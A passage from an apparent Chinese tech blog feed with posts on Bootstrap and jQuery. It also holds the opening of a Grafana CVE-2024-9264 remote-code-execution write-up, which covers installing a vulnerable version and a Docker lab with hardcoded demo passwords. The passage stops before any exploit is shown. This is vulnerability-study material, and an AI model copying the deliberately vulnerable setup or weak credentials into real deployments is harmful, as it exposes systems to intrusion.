class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-footer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-secondary<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>关闭<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>保存更改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、优点与不足"><a href="#五、优点与不足" class="headerlink" title="五、优点与不足"></a>五、优点与不足</h1><h2 id="5-1-优点"><a href="#5-1-优点" class="headerlink" title="5.1 优点"></a>5.1 <strong>优点</strong></h2><ul><li>快速开发：减少 CSS 和 JavaScript 的重复工作。</li><li>高质量：提供一致的视觉和功能体验。</li><li>大量社区支持和插件。</li></ul><h2 id="5-2-不足"><a href="#5-2-不足" class="headerlink" title="5.2 不足"></a>5.2 <strong>不足</strong></h2><ul><li>样式可能显得过于通用，缺乏个性化。</li><li>对小型项目可能显得繁重。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Bootstrap 是前端开发的强大工具，特别适用于需要快速开发、响应式设计和一致性体验的项目。尽管现代前端框架（如 React 和 Vue）提供了更多交互功能，但 Bootstrap 在传统网站开发中仍具有重要地位。</p>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bootstrap </tag>
            
            <tag> 前端开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/jquery/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/jquery/</url>
      
        <content type="html"><![CDATA[<h1 id="一、jQuery简介"><a href="#一、jQuery简介" class="headerlink" title="一、jQuery简介"></a>一、jQuery简介</h1><p>jQuery 是一个快速、简洁、跨平台的 JavaScript 库，专为简化 HTML 文档操作、事件处理、动画制作以及与服务器端的交互（Ajax）而设计。它由 John Resig 于 2006 年创建，现已成为前端开发中最广泛使用的工具之一。</p><p>虽然 jQuery 曾在前端开发中占据主导地位，但随着现代框架（如 React、Vue、Angular）的崛起，它的使用有所减少。然而，由于其简单性和广泛支持，jQuery 在许多项目中仍然有一席之地，尤其是在需要快速开发或维护旧项目时。</p><h1 id="二、-jQuery-核心特点"><a href="#二、-jQuery-核心特点" class="headerlink" title="二、 jQuery 核心特点"></a>二、 jQuery 核心特点</h1><h3 id="1-跨浏览器兼容性"><a href="#1-跨浏览器兼容性" class="headerlink" title="1. 跨浏览器兼容性"></a>1. <strong>跨浏览器兼容性</strong></h3><p>jQuery 解决了不同浏览器对 JavaScript 的实现差异，提供统一的接口，使开发者能更轻松地编写跨浏览器的代码。</p><h3 id="2-简化-DOM-操作"><a href="#2-简化-DOM-操作" class="headerlink" title="2. 简化 DOM 操作"></a>2. <strong>简化 DOM 操作</strong></h3><p>通过 jQuery，开发者可以用简单、直观的语法轻松地选择、操作 HTML 元素。例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 使用 jQuery 修改元素内容</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"新的内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-事件处理"><a href="#3-事件处理" class="headerlink" title="3. 事件处理"></a>3. <strong>事件处理</strong></h3><p>jQuery 提供了简便的事件绑定和解绑方法，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 为按钮绑定点击事件</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myButton"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"按钮被点击！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-动画与效果"><a href="#4-动画与效果" class="headerlink" title="4. 动画与效果"></a>4. <strong>动画与效果</strong></h3><p>jQuery 内置多种动画效果，可以快速实现页面动态效果：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 淡入元素</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeIn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-Ajax-支持"><a href="#5-Ajax-支持" class="headerlink" title="5. Ajax 支持"></a>5. <strong>Ajax 支持</strong></h3><p>jQuery 提供了方便的 Ajax 方法，可以轻松与服务器交互：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 通过 jQuery 发起 GET 请求</span>$<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"example.com/api"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-丰富的插件生态"><a href="#6-丰富的插件生态" class="headerlink" title="6. 丰富的插件生态"></a>6. <strong>丰富的插件生态</strong></h3><p>jQuery 拥有大量第三方插件，可以扩展其功能，满足特定需求。</p><h3 id="7-链式调用"><a href="#7-链式调用" class="headerlink" title="7. 链式调用"></a>7. <strong>链式调用</strong></h3><p>jQuery 的链式调用特性允许在一条语句中连续调用多个方法，从而使代码更加简洁：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"highlight"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeIn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"更新内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-轻量级"><a href="#8-轻量级" class="headerlink" title="8. 轻量级"></a>8. <strong>轻量级</strong></h3><p>尽管功能强大，jQuery 的核心库大小较小，加载速度快。</p><h1 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"&lt;url id="</span><span class="token string">" type="</span>url<span class="token string">" status="</span><span class="token string">" title="</span><span class="token string">" wc="</span><span class="token string">"&gt;https://code.jquery.com/jquery-3.6.0.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>url<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>        <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#toggleButton"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>button id<span class="token operator">=</span><span class="token string">"toggleButton"</span><span class="token operator">&gt;</span>切换显示<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>p id<span class="token operator">=</span><span class="token string">"message"</span><span class="token operator">&gt;</span>这是一个可切换的段落。<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这是一个完整且简单的 jQuery 示例代码。它展示了如何使用 jQuery 实现事件处理和元素的显示/隐藏效果。</p><h3 id="功能说明"><a href="#功能说明" class="headerlink" title="功能说明"></a>功能说明</h3><ol><li><strong>加载 jQuery</strong><br>在 <code>&lt;head&gt;</code> 部分通过 <code>&lt;script&gt;</code> 标签加载了 jQuery 的官方库（版本 3.6.0）。</li><li><strong>DOM 准备就绪处理</strong><br>使用 <code>$(document).ready()</code> 确保在 DOM 加载完成后再执行代码。</li><li><strong>按钮点击事件</strong><br>当用户点击按钮（ID 为 <code>toggleButton</code>）时，会触发绑定的事件处理器。</li><li><strong>切换显示/隐藏</strong><br><code>$("#message").toggle();</code> 方法会在每次点击按钮时切换段落（ID 为 <code>message</code>）的显示状态。</li></ol><h3 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h3><p>初始状态下，页面上显示一个按钮和一段文字。</p><p>点击按钮后，文字会消失。</p><p>再次点击按钮，文字重新出现。</p><h3 id="扩展功能"><a href="#扩展功能" class="headerlink" title="扩展功能"></a>扩展功能</h3><p>如果你想增加一些效果，比如使用动画，可以替换 <code>toggle</code> 为 <code>fadeToggle</code> 或 <code>slideToggle</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeToggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用淡入淡出效果切换</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端开发 </tag>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Grafana表达式远程代码执行(CVE-2024-9264)</title>
      <link href="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/"/>
      <url>/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Grafana基础"><a href="#一、Grafana基础" class="headerlink" title="一、Grafana基础"></a>一、Grafana基础</h1><h2 id="1-1-Grafana是什么？"><a href="#1-1-Grafana是什么？" class="headerlink" title="1.1 Grafana是什么？"></a>1.1 Grafana是什么？</h2><p>Grafana是一款开源的数据可视化和监控平台，它允许用户通过创建动态仪表板来监视和分析数据。</p><p>以下是Grafana的一些主要特点和功能：</p><ol><li><strong>多数据源支持</strong>：Grafana支持多种数据源，包括但不限于Graphite、Prometheus、Elasticsearch、InfluxDB等，可以从多种数据源中收集数据，并在同一仪表板中进行统一展示。</li><li><strong>丰富的可视化选项</strong>：提供了各种图表类型、样式和配置选项，用户可以根据需求定制图表。</li><li><strong>告警功能</strong>：支持设置警报规则，并在达到特定条件时发送通知。</li><li><strong>插件生态系统</strong>：拥有丰富的插件生态系统，用户可以根据需要扩展和定制功能。</li><li><strong>社区支持</strong>：拥有活跃的开发社区，提供了丰富的文档、教程和支持资源。</li><li><strong>跨平台性</strong>：Grafana是一个跨平台的开源的分析和可视化工具，可以通过将采集的数据查询然后可视化的展示，并及时通知。</li><li><strong>图表与可视化</strong>：Grafana具有快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式，让复杂的数据展示的美观而优雅。</li><li><strong>实际应用场景广泛</strong>：Grafana广泛应用于IT基础设施监控、业务数据分析与可视化、实时数据仪表板构建等领域。</li><li><strong>版本更新</strong>：Grafana 10.0版本在2023年6月发布，带来了许多新功能和改进，如更新的Panel面板、Dashboard、导航栏以及Grafana Altering等。</li></ol><p>Grafana以其强大的功能和灵活性，成为了数据可视化和监控领域的重要工具，适用于各种规模的项目和不同的监控需求。</p><h2 id="1-2-安装部署（本地部署）"><a href="#1-2-安装部署（本地部署）" class="headerlink" title="1.2 安装部署（本地部署）"></a>1.2 安装部署（本地部署）</h2><p>在Ubuntu上安装指定版本的Grafana，你可以按照以下步骤操作：</p><p>下面是我所使用的ubuntu系统信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ubuntu <span class="token number">22.04</span>.3 LTS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2014.00.27.png" alt="系统信息" style="zoom:40%;"><h3 id="1-2-1-更新系统软件包"><a href="#1-2-1-更新系统软件包" class="headerlink" title="1.2.1 更新系统软件包"></a>1.2.1 <strong>更新系统软件包</strong></h3><p>更新你的Ubuntu系统以确保所有软件包和依赖项是最新的。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo apt updatesudo apt upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>命令详解：</p><p><code>sudo apt update</code> 和 <code>sudo apt upgrade</code> 是在基于 Debian 的 Linux 发行版（如 Ubuntu）中使用的命令，它们用于管理和更新系统软件包。下面是这两个命令的详细解释：</p><h3 id="sudo-apt-update"><a href="#sudo-apt-update" class="headerlink" title="sudo apt update"></a>sudo apt update</h3><ul><li><code>sudo</code>：这是一个命令行实用程序，允许授权的用户以另一个用户的安全权限执行命令，默认情况下是以超级用户（root）的权限执行。</li><li><code>apt</code>：是“Advanced Package Tool”的缩写，它是 Debian 及其衍生版（如 Ubuntu）的软件包管理工具。</li><li><code>update</code>：这是 <code>apt</code> 工具的一个命令，用于从源服务器同步软件包索引文件。这个命令不会更改任何已安装的软件包，它只是更新本地数据库，使其与软件源中的最新软件包信息保持一致。</li></ul><p>执行 <code>sudo apt update</code> 时，系统会从每个启用的软件源（在 <code>/etc/apt/sources.list</code> 和 <code>/etc/apt/sources.list.d/</code> 下的文件中定义）获取最新的软件包列表。这个操作是安装、升级或移除软件包之前的重要步骤，因为它确保了你拥有最新的软件包信息。</p><h3 id="sudo-apt-upgrade"><a href="#sudo-apt-upgrade" class="headerlink" title="sudo apt upgrade"></a>sudo apt upgrade</h3><ul><li><code>upgrade</code>：这是 <code>apt</code> 的另一个命令，用于升级所有可升级的软件包至最新版本。</li></ul><p>执行 <code>sudo apt upgrade</code> 时，系统会查找所有已安装的软件包，如果有可用的更新（这些信息是通过 <code>sudo apt update</code> 获得的），则将它们升级到最新版本。这个命令会处理依赖关系，确保在升级过程中所需的依赖项也会被安装或升级。</p></blockquote><h3 id="1-2-2-访问官网"><a href="#1-2-2-访问官网" class="headerlink" title="1.2.2 访问官网"></a>1.2.2 访问官网</h3><p><a href="https://grafana.com/grafana/download/11.1.0?pg=get&amp;plcmt=selfmanaged-box1-cta1">https://grafana.com/grafana/download/11.1.0?pg=get&amp;plcmt=selfmanaged-box1-cta1</a></p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.30.28.png" alt="grafana官网" style="zoom:50%;"><p>【选择特定的版本，CVE-2024-9264被评为9.9的CVSS评分，影响Grafana 11.0.x、11.1.x和11.2.x版本。】</p><p>这里我选择的是11.1.0版本的，后续按照官方提示操作即可。</p><h3 id="1-2-3-安装grafana"><a href="#1-2-3-安装grafana" class="headerlink" title="1.2.3 安装grafana"></a>1.2.3 安装grafana</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> adduser libfontconfig1 musl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>bug处理</li></ul><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.34.52.png" alt="bug" style="zoom:50%;"><p>错误解释：</p><ul><li><code>E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 27625 (unattended-upgr)</code>：这个错误表明 <code>apt-get</code> 无法获取 <code>/var/lib/dpkg/lock-frontend</code> 这个锁文件，因为它正被进程号为 27625 的进程（<code>unattended-upgr</code>，即无人值守升级进程）占用。</li><li><code>N: Be aware that removing the lock file is not a solution and may break your system.</code>：这是一个警告，提醒用户不要简单地删除锁文件，因为这可能会破坏系统。</li><li><code>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</code>：这个错误再次强调无法获取 dpkg 前端锁，询问是否有其他进程正在使用它。</li></ul><p>这个错误通常发生在系统正在进行另一个软件包管理操作，比如另一个 <code>apt-get</code> 命令或者系统更新正在运行。解决这个问题的方法通常是等待当前的软件包管理操作完成，或者如果确定没有其他操作在进行，可以检查是否有僵尸进程占用了锁文件。</p><p>如果需要强制终止占用锁文件的进程，可以使用以下命令（请谨慎使用，因为这可能会导致系统不稳定）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token number">27625</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再次尝试运行你的 <code>apt-get</code> 命令。如果你不确定，最好先检查系统是否有正在运行的更新或软件包管理操作。</p></blockquote><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.38.52-3722748.png" alt="依赖安装" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dl.grafana.com/enterprise/release/grafana-enterprise_11.1.0_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.47.36.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> grafana-enterprise_11.1.0_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>dpkg</code>：是 Debian 包管理器的命令行工具，用于安装、构建、拆除和检查 Debian 软件包。</li><li><code>-i</code>：这是 <code>dpkg</code> 命令的一个选项，代表 <code>--install</code>，用于安装本地的 Debian 软件包。</li></ul></blockquote><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.51.52.png" alt="截屏2024-12-09 13.51.52" style="zoom:50%;"><h3 id="1-2-4-启动服务"><a href="#1-2-4-启动服务" class="headerlink" title="1.2.4 启动服务"></a>1.2.4 启动服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /bin/systemctl start grafana-server或systemctl start grafana-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="1-2-5-查看启动状态"><a href="#1-2-5-查看启动状态" class="headerlink" title="1.2.5 查看启动状态"></a>1.2.5 查看启动状态</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /bin/systemctl status grafana-server或systemctl status grafana-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.55.03.png" alt="截屏2024-12-09 13.55.03" style="zoom:50%;"><h3 id="1-2-6-访问服务"><a href="#1-2-6-访问服务" class="headerlink" title="1.2.6 访问服务"></a>1.2.6 访问服务</h3><p>浏览器输入IP:3000进行登录<br>        默认用户密码：admin/admin</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.57.27.png" alt="本机测试" style="zoom:40%;"><p>【本机测试，访问成功！】</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.58.24.png" alt="局域网测试" style="zoom:30%;"><p>【局域网测试，访问成功！】</p><p>第一次登录之后会强制修改密码（毕竟admin/admin太弱了）。</p><h2 id="1-3-Docker部署"><a href="#1-3-Docker部署" class="headerlink" title="1.3 Docker部署"></a>1.3 Docker部署</h2><ul><li>下面提供另外一种Docker部署的方法供参考：</li></ul><p>使用 Grafana 11.0.0 构建环境，安装  <code>duckdb</code> 二进制文件并将其添加到 Grafana 的 <code>$PATH</code> 中。</p><p>下载 <a href="https://github.com/duckdb/duckdb/releases/download/v0.8.1/duckdb_cli-linux-amd64.zip">duckdb_cli-linux-amd64.zip</a>，与 Dockerfile、docker-compose.yml 放置在同一目录。</p><p>Dockerfile</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> grafana/grafana:11.0.0-ubuntu</span><span class="token instruction"><span class="token keyword">USER</span> root</span><span class="token comment"># Install DuckDB</span><span class="token instruction"><span class="token keyword">COPY</span> duckdb_cli-linux-amd64.zip /tmp/</span><span class="token instruction"><span class="token keyword">RUN</span> apt-get update &amp;&amp; apt-get install -y &amp;&amp; apt-get install unzip -y</span>    &amp;&amp; unzip /tmp/duckdb_cli-linux-amd64.zip -d /usr/local/bin/ \    &amp;&amp; chmod +x /usr/local/bin/duckdb \    &amp;&amp; rm /tmp/duckdb_cli-linux-amd64.zip<span class="token comment"># Add DuckDB to the PATH</span><span class="token instruction"><span class="token keyword">ENV</span> PATH=<span class="token string">"/usr/local/bin:${PATH}"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>docker-compose.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">mysql</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql<span class="token punctuation">:</span>latest    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> MYSQL_ROOT_PASSWORD=rootpassword      <span class="token punctuation">-</span> MYSQL_DATABASE=grafanadb      <span class="token punctuation">-</span> MYSQL_USER=grafana      <span class="token punctuation">-</span> MYSQL_PASSWORD=grafanapassword    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./mysql<span class="token punctuation">-</span>data<span class="token punctuation">:</span>/var/lib/mysql    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"3306:3306"</span>    <span class="token key atrule">healthcheck</span><span class="token punctuation">:</span>      <span class="token key atrule">test</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"CMD"</span><span class="token punctuation">,</span> <span class="token string">"mysqladmin"</span><span class="token punctuation">,</span> <span class="token string">"ping"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">,</span> <span class="token string">"localhost"</span><span class="token punctuation">]</span>      <span class="token key atrule">interval</span><span class="token punctuation">:</span> 10s      <span class="token key atrule">timeout</span><span class="token punctuation">:</span> 5s      <span class="token key atrule">retries</span><span class="token punctuation">:</span> <span class="token number">3</span>    <span class="token key atrule">grafana</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span> .    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"3000:3000"</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> GF_SECURITY_ADMIN_PASSWORD=abc123<span class="token tag">!</span>      <span class="token punctuation">-</span> GF_DATABASE_TYPE=mysql      <span class="token punctuation">-</span> GF_DATABASE_HOST=mysql<span class="token punctuation">:</span><span class="token number">3306</span>      <span class="token punctuation">-</span> GF_DATABASE_USER=grafana      <span class="token punctuation">-</span> GF_DATABASE_PASSWORD=grafanapassword      <span class="token punctuation">-</span> GF_DATABASE_NAME=grafanadb    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> grafana<span class="token punctuation">-</span>storage<span class="token punctuation">:</span>/var/lib/grafana      <span class="token punctuation">-</span> ./grafana.ini<span class="token punctuation">:</span>/etc/grafana/grafana.ini    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>        <span class="token key atrule">mysql</span><span class="token punctuation">:</span>         <span class="token key atrule">condition</span><span class="token punctuation">:</span> service_healthy  <span class="token key atrule">volumes</span><span class="token punctuation">:</span>  <span class="token key atrule">grafana-storage</span><span class="token punctuation">:</span>  mysql<span class="token punctuation">-</span>storage<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当前目录执行如下命令，启动一个 Grafana 11.0.0 环境：</p><pre class="line-numbers language-none"><code class="language-none">docker build -t grafana:11.0.0 .docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>环境启动后，访问 <code>http://your-ip:3000</code> 即可查看到管理后台。由于配置了密码，需要使用 <code>admin/abc123!</code> 